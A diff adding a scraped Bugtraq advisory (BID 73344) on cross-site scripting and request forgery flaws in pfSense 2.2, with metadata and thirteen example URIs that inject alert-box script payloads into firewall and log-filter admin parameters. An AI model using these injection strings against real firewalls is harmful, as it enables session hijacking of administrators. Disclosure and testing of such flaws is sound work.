@@ -1,0 +1,101 @@
+#SpeeDr00t@Black Falcon<br>#bid73344<p><b><span style="font-size: 18pt;">pfSense Cross Site Scripting and Cross Site Request Forgery Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/73344/info">info</a><br><a href="http://www.securityfocus.com/bid/73344/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/73344/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/73344/solution">solution</a><br><a href="http://www.securityfocus.com/bid/73344/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				73344
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2015-2294<br/>
+				
+					CVE-2015-2295<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Mar 25 2015 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Mar 25 2015 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				High-Tech Bridge
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Bsdperimeter pfSense  2.2<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Bsdperimeter pfSense  2.2.1<br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	To exploit these issues an attacker must entice an unsuspecting victim into following a malicious URI or visiting a malicious website. <br/> <br/>The following example URIs are available: <br/> <br/>https://www.example.com/status_captiveportal.php?zone=%27%22%3E%3Cscript%3Ealert%28%27ImmuniWeb%27%29;%3C/script%3E <br/>https://www.example.com/firewall_rules.php?undodrag=1&amp;amp;dragtable=&amp;amp;if=%27%22%3E%3Cscript%3Ealert%28%27ImmuniWeb%27%29;%3C/script%3E <br/>https://www.example.com/firewall_rules.php?if=wan&amp;amp;undodrag=1&amp;amp;dragtable%5B%5D=%27%22%3E%3Cscript%3Ealert%28%27ImmuniWeb%27%29;%3C/script%3E <br/>https://www.example.com/firewall_shaper.php?interface=wan&amp;amp;action=add&amp;amp;queue=%27%22%3E%3Cscript%3Ealert%28%27ImmuniWeb%27%29;%3C/script%3E <br/>https://www.example.com/services_unbound_acls.php?act=edit&amp;amp;id=%27%22%3E%3Cscript%3Ealert%28%27ImmuniWeb%27%29;%3C/script%3E <br/>https://www.example.com/diag_logs_filter.php?filterlogentries_submit=1&amp;amp;filterlogentries_time=%27%22%3E%3Cscript%3Ealert%28%27ImmuniWeb%27%29;%3C/script%3E <br/>https://www.example.com/diag_logs_filter.php?filterlogentries_submit=1&amp;amp;filterlogentries_sourceipaddress=%27%22%3E%3Cscript%3Ealert%28%27ImmuniWeb%27%29;%3C/script%3E <br/>https://www.example.com/diag_logs_filter.php?filterlogentries_submit=1&amp;amp;filterlogentries_sourceport=%27%22%3E%3Cscript%3Ealert%28%27ImmuniWeb%27%29;%3C/script%3E <br/>https://www.example.com/diag_logs_filter.php?filterlogentries_submit=1&amp;amp;filterlogentries_destinationipaddress=%27%22%3E%3Cscript%3Ealert%28%27ImmuniWeb%27%29;%3C/script%3E <br/>https://www.example.com/diag_logs_filter.php?filterlogentries_submit=1&amp;amp;filterlogentries_interfaces=%27%22%3E%3Cscript%3Ealert%28%27ImmuniWeb%27%29;%3C/script%3E <br/>https://www.example.com/diag_logs_filter.php?filterlogentries_submit=1&amp;amp;filterlogentries_destinationport=%27%22%3E%3Cscript%3Ealert%28%27ImmuniWeb%27%29;%3C/script%3E <br/>https://www.example.com/diag_logs_filter.php?filterlogentries_submit=1&amp;amp;filterlogentries_protocolflags=%27%22%3E%3Cscript%3Ealert%28%27ImmuniWeb%27%29;%3C/script%3E <br/>https://www.example.com/diag_logs_filter.php?filterlogentries_submit=1&amp;amp;filterlogentries_qty=%27%22%3E%3Cscript%3Ealert%28%27ImmuniWeb%27%29;%3C/script%3E
+	
+		<ul>
+</ul>
+</div>
